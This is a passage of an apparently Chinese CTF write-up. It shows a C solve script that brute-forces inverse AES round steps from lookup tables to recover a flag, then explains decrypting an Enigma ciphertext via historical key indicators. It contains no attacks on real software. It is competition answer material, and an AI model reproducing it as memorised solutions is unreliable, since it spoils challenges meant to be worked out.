class="number">0x86</span>, <span class="number">0x8f</span>, <span class="number">0x8c</span>, <span class="number">0x89</span>, <span class="number">0x8a</span>,</span><br><span class="line">	<span class="number">0xab</span>, <span class="number">0xa8</span>, <span class="number">0xad</span>, <span class="number">0xae</span>, <span class="number">0xa7</span>, <span class="number">0xa4</span>, <span class="number">0xa1</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb0</span>, <span class="number">0xb5</span>, <span class="number">0xb6</span>, <span class="number">0xbf</span>, <span class="number">0xbc</span>, <span class="number">0xb9</span>, <span class="number">0xba</span>,</span><br><span class="line">	<span class="number">0xfb</span>, <span class="number">0xf8</span>, <span class="number">0xfd</span>, <span class="number">0xfe</span>, <span class="number">0xf7</span>, <span class="number">0xf4</span>, <span class="number">0xf1</span>, <span class="number">0xf2</span>, <span class="number">0xe3</span>, <span class="number">0xe0</span>, <span class="number">0xe5</span>, <span class="number">0xe6</span>, <span class="number">0xef</span>, <span class="number">0xec</span>, <span class="number">0xe9</span>, <span class="number">0xea</span>,</span><br><span class="line">	<span class="number">0xcb</span>, <span class="number">0xc8</span>, <span class="number">0xcd</span>, <span class="number">0xce</span>, <span class="number">0xc7</span>, <span class="number">0xc4</span>, <span class="number">0xc1</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xd0</span>, <span class="number">0xd5</span>, <span class="number">0xd6</span>, <span class="number">0xdf</span>, <span class="number">0xdc</span>, <span class="number">0xd9</span>, <span class="number">0xda</span>,</span><br><span class="line">	<span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x5d</span>, <span class="number">0x5e</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x4f</span>, <span class="number">0x4c</span>, <span class="number">0x49</span>, <span class="number">0x4a</span>,</span><br><span class="line">	<span class="number">0x6b</span>, <span class="number">0x68</span>, <span class="number">0x6d</span>, <span class="number">0x6e</span>, <span class="number">0x67</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x73</span>, <span class="number">0x70</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x7f</span>, <span class="number">0x7c</span>, <span class="number">0x79</span>, <span class="number">0x7a</span>,</span><br><span class="line">	<span class="number">0x3b</span>, <span class="number">0x38</span>, <span class="number">0x3d</span>, <span class="number">0x3e</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x2f</span>, <span class="number">0x2c</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>,</span><br><span class="line">	<span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x1f</span>, <span class="number">0x1c</span>, <span class="number">0x19</span>, <span class="number">0x1a</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> final_enc[] =</span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0x1d</span>, <span class="number">0xba</span>,<span class="number">0x82</span>,<span class="number">0x39</span>,</span><br><span class="line">	<span class="number">0x1c</span>, <span class="number">0x25</span>,<span class="number">0x6b</span>,<span class="number">0x8d</span>,</span><br><span class="line">	<span class="number">0x5</span>,  <span class="number">0x20</span>,<span class="number">0x99</span>,<span class="number">0xa2</span>,</span><br><span class="line">	<span class="number">0x17</span>, <span class="number">0x6d</span>,<span class="number">0xc</span>, <span class="number">0x4f</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P1</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> P1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P2</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> P2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P3</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> P3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TEST_RDTSC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RevSubBytes</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Arr)</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">		Arr[i] = RevSbox[Arr[i]];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RevShiftRow</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Arr)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> m[] = &#123; <span class="number">0</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> ret[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">		ret[i] = Arr[m[i]];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">		Arr[j] = ret[j];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RevMixColumn</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Arr)</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> new_b0, new_b1, new_b2, new_b3;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> tmp[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> b0 = <span class="number">0</span>; b0 &lt; <span class="number">256</span>; b0++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="type">int</span> b3 = <span class="number">0</span>; b3 &lt; <span class="number">256</span>; b3++)</span><br><span class="line">					&#123;</span><br><span class="line">						new_b0 = GF_MULT_2[b0] ^ GF_MULT_3[b1] ^ GF_MULT_1[b2] ^ GF_MULT_1[b3];</span><br><span class="line">						new_b1 = GF_MULT_1[b0] ^ GF_MULT_2[b1] ^ GF_MULT_3[b2] ^ GF_MULT_1[b3];</span><br><span class="line">						new_b2 = GF_MULT_1[b0] ^ GF_MULT_1[b1] ^ GF_MULT_2[b2] ^ GF_MULT_3[b3];</span><br><span class="line">						new_b3 = GF_MULT_3[b0] ^ GF_MULT_1[b1] ^ GF_MULT_1[b2] ^ GF_MULT_2[b3];</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (</span><br><span class="line">							(new_b0 == Arr[<span class="number">4</span> * i]) &amp;&amp;</span><br><span class="line">							(new_b1 == Arr[<span class="number">4</span> * i + <span class="number">1</span>]) &amp;&amp;</span><br><span class="line">							(new_b2 == Arr[<span class="number">4</span> * i + <span class="number">2</span>]) &amp;&amp;</span><br><span class="line">							(new_b3 == Arr[<span class="number">4</span> * i + <span class="number">3</span>])</span><br><span class="line">							) </span><br><span class="line">						&#123;</span><br><span class="line">							tmp[<span class="number">4</span> * i] = b0;</span><br><span class="line">							tmp[<span class="number">4</span> * i + <span class="number">1</span>] = b1;</span><br><span class="line">							tmp[<span class="number">4</span> * i + <span class="number">2</span>] = b2;</span><br><span class="line">							tmp[<span class="number">4</span> * i + <span class="number">3</span>] = b3;</span><br><span class="line">							<span class="keyword">goto</span> END;</span><br><span class="line">						&#125;</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	END:</span><br><span class="line"></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) </span><br><span class="line">	&#123;</span><br><span class="line">		Arr[j] = tmp[j];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Final</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> Final</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> P1</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> tmp2;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> arr2[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">0xF</span>; ++k)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">			tmp2 = *((<span class="type">unsigned</span> __int8*)&amp;DwArr[<span class="number">64</span> * k + <span class="number">36864</span>] + i);</span><br><span class="line">			<span class="keyword">if</span> (tmp2 == Enc[k]) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="comment">//printf(&quot;i:%d\n&quot;, i);</span></span><br><span class="line">				arr2[k] = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, arr2[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> P2</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> tmp;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; <span class="number">256</span>; m++) &#123;</span><br><span class="line">					tmp = DwArr[<span class="number">29440</span> + i] ^ DwArr[<span class="number">29184</span> + j] ^ DwArr[<span class="number">28928</span> + k] ^ DwArr[<span class="number">28672</span> + m];</span><br><span class="line">					<span class="keyword">if</span> (tmp == <span class="number">0xac110172</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;%d, %d, %d, %d&quot;</span>, i, j, k, m);</span><br><span class="line">						<span class="keyword">goto</span> End;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> P3</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> test1[] = &#123;</span><br><span class="line">		<span class="number">0x72</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0xac</span>, </span><br><span class="line">		<span class="number">0x65</span>, <span class="number">0x5f</span>, <span class="number">0x18</span>, <span class="number">0x38</span>, </span><br><span class="line">		<span class="number">0x30</span>, <span class="number">0xe2</span>, <span class="number">0x67</span>, <span class="number">0xad</span>, </span><br><span class="line">		<span class="number">0x5c</span>, <span class="number">0x42</span>, <span class="number">0xe7</span>, <span class="number">0x0d</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> test2[] = &#123;</span><br><span class="line">		<span class="number">0x72</span>, <span class="number">0x5f</span>, <span class="number">0x67</span>, <span class="number">0x0d</span>, </span><br><span class="line">		<span class="number">0x65</span>, <span class="number">0xe2</span>, <span class="number">0xe7</span>, <span class="number">0xac</span>, </span><br><span class="line">		<span class="number">0x30</span>, <span class="number">0x42</span>, <span class="number">0x11</span>, <span class="number">0x38</span>, </span><br><span class="line">		<span class="number">0x5c</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0xad</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	unsigned char test1[] = &#123;</span></span><br><span class="line"><span class="comment">		0,  1,  2,  3,</span></span><br><span class="line"><span class="comment">		4,  5,  6,  7,</span></span><br><span class="line"><span class="comment">		8,  9,  10, 11,</span></span><br><span class="line"><span class="comment">		12, 13, 14, 15</span></span><br><span class="line"><span class="comment">	&#125;;</span></span><br><span class="line"><span class="comment">	unsigned char test2[] = &#123;</span></span><br><span class="line"><span class="comment">		0, 5,10,15,</span></span><br><span class="line"><span class="comment">		4, 9,14, 3,</span></span><br><span class="line"><span class="comment">		8,13, 2, 7,</span></span><br><span class="line"><span class="comment">	   12, 1, 6, 11</span></span><br><span class="line"><span class="comment">	&#125;;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	RevShiftBytes(test2);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, test1[i] - test2[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> TEST</span></span><br><span class="line">	<span class="comment">// SBox + Shift</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> test1[] = &#123; <span class="number">99</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">1</span>, <span class="number">171</span>, <span class="number">123</span>, <span class="number">48</span>, <span class="number">215</span>, <span class="number">119</span>, <span class="number">197</span>, <span class="number">254</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">43</span> &#125;;</span><br><span class="line">	<span class="comment">// SBox</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> test2[] = &#123; <span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span> &#125;;</span><br><span class="line">	<span class="comment">// SBox + Shift + Mix</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> test3[] = &#123; <span class="number">106</span>, <span class="number">106</span>, <span class="number">92</span>, <span class="number">69</span>, <span class="number">44</span>, <span class="number">109</span>, <span class="number">51</span>, <span class="number">81</span>, <span class="number">176</span>, <span class="number">217</span>, <span class="number">93</span>, <span class="number">97</span>, <span class="number">39</span>, <span class="number">156</span>, <span class="number">33</span>, <span class="number">92</span> &#125;;</span><br><span class="line"></span><br><span class="line">	RevMixColumn(test3);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;RevMixColumn&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, test3[h]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	RevShiftRow(test3);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;RevShiftBytes:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, test3[h]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	RevSubBytes(test3);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;RevSubBytes:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, test3[h]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//for (int i = 0; i &lt; 10; i++) &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> final_enc[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x1d</span>, <span class="number">0xba</span>,<span class="number">0x82</span>,<span class="number">0x39</span>,</span><br><span class="line">		<span class="number">0x1c</span>, <span class="number">0x25</span>,<span class="number">0x6b</span>,<span class="number">0x8d</span>,</span><br><span class="line">		<span class="number">0x5</span>,  <span class="number">0x20</span>,<span class="number">0x99</span>,<span class="number">0xa2</span>,</span><br><span class="line">		<span class="number">0x17</span>, <span class="number">0x6d</span>,<span class="number">0xc</span>, <span class="number">0x4f</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	RevShiftRow(final_enc);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;RevShiftRow:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	RevSubBytes(final_enc);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;RevSubBytes:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		RevMixColumn(final_enc);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;RevMixColumn&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		RevShiftRow(final_enc);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;RevShiftRow:&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">		RevSubBytes(final_enc);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;RevSubBytes:&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, final_enc[h]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Finally:&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span> ,final_enc[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span>*)final_enc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> Final</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> tmp;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">8</span>; a &gt;= <span class="number">0</span>; --a) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">3</span>; b &gt;= <span class="number">0</span>; ) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++) &#123;</span><br><span class="line">						<span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; <span class="number">256</span>; m++) &#123;</span><br><span class="line">							tmp = DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">3</span> + <span class="number">16</span> * a) + i] ^			<span class="comment">// i == out[4*b + 3]</span></span><br><span class="line">								  DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">2</span> + <span class="number">16</span> * a) + j] ^			<span class="comment">// j == out[4*b + 2]</span></span><br><span class="line">								  DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">1</span> + <span class="number">16</span> * a) + k] ^ 			<span class="comment">// k == out[4*b + 1]</span></span><br><span class="line">								  DwArr[<span class="number">256</span> * (<span class="number">4</span> * b + <span class="number">0</span> + <span class="number">16</span> * a) + m];			<span class="comment">// m == out[4*b + 0]</span></span><br><span class="line">							<span class="keyword">if</span> (tmp == ((<span class="type">unsigned</span> <span class="type">int</span>*)Enc)[b]) &#123;</span><br><span class="line">								<span class="built_in">printf</span>(<span class="string">&quot;a:%2d; b:%2d | &quot;</span>, a, b);</span><br><span class="line">								<span class="built_in">printf</span>(<span class="string">&quot;%02x, %02x, %02x, %02x \n&quot;</span>, i, j, k, m);</span><br><span class="line">								Enc[<span class="number">4</span> * b] = m;</span><br><span class="line">								Enc[<span class="number">4</span> * b + <span class="number">1</span>] = k;</span><br><span class="line">								Enc[<span class="number">4</span> * b + <span class="number">2</span>] = j;</span><br><span class="line">								Enc[<span class="number">4</span> * b + <span class="number">3</span>] = i;</span><br><span class="line">								<span class="keyword">goto</span> Label1;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">		Label1:</span><br><span class="line">			--b;</span><br><span class="line">		&#125;</span><br><span class="line">		RevShiftBytes(Enc);</span><br><span class="line">		<span class="comment">//putchar(&#x27;\n&#x27;);</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; <span class="number">16</span>; h++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, Enc[h]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会不会是因为当时没人做所以又丢过来了？2333因为队里的re师傅复盘了这一题所以就有印象了</p>
<h2 id="赛博朋克人">赛博朋克人</h2>
<p>之前打CTFshow的吃瓜杯了解到一个库叫pycipher，内置了enigma函数，可以直接调用。</p>
<p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912111805833.png" alt="image-20210912111805833"></p>
<p>这个表显示了9月每一天的参数信息，接下来只需要找出是哪一天的参数即可</p>
<p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912111851723.png" alt="image-20210912111851723"></p>
<p>根据题目给出的提示：当今网络世界有电子越共，那么也会有赛博德国人，而且还喜欢用相同的密码，请找出他们的通信内容(内容是德文，flag是正常的flag，而且通信的格式还原历史，传递密钥的方法为二战中后期改进的)。</p>
<p>之后查询了大量资料，总算是还原出了这些内容所代表的含义：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="number">0911</span> = <span class="number">1</span>tle = <span class="number">1</span>tl = <span class="number">350</span> = RZS NAJ =</span><br><span class="line">nkfgp roqad <span class="keyword">boprv </span>yrdhy zwamf qsrhb owqvt <span class="keyword">jzotr </span>ffcjq snpqh kpwzm fprru gufez xsuws aohyw xbreu pifbz kagxj <span class="keyword">blbha </span><span class="keyword">jzixj </span>zrasn zxkay lpaza ejwou itcip dfdgp rbjnv xuqzq qhtya xwwik wyybx kdgrc slrkj pgjay aidwa <span class="keyword">jeszp </span>pbqat njojg <span class="keyword">jrplb </span>kkhot <span class="keyword">joqpg </span>vwecj soabm aupsr fenug ybxmr <span class="keyword">jloch </span>kmjgc tznxl tnrqx pbeph fwymn gpoor pjkkb plkwb kxzeq quorp ipuvs utyae qyzgp mqnai iysse gzsht tsrmv crrkr opuxj tqshv ypdrw rvnzt cstlj </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>第一行：9月11日的内容，总共一部分，这是第一部分，有350个字母（包括第一组的buchstabenkennngruppe)，所谓buchstabenkennngruppe
NKFGP显示出了操作者的键位设置，用于加密信息。其中前两个为随机字母，后面三个为某一天的kennngruppe信息，根据上表可以知道这是用的9月10号的参数。于是可以确定rotors,ringstellung,steckers参数，那么初始设置settings呢？</p>
<p>别忘了，我们第一行还有两组字母，其中RZS是操作者的初始设置，而NAJ为结果，那么以RZS为初始键位设置，解密NAJ后得到的信息便是接收者需要设置的settings。reflector参数只可能是ABC，这里可以爆破。</p>
<p>综上，我们已经拿到了解密enigma所需要的全部信息。逐个尝试后发现用B的reflector解密出来的内容重复率很高，一开始卡住了。题目所说的是德国，正好我有个室友会德语，于是让他帮忙看一下，一眼就看出来是德文数字，于是翻译过来拿到结果一串字符</p>
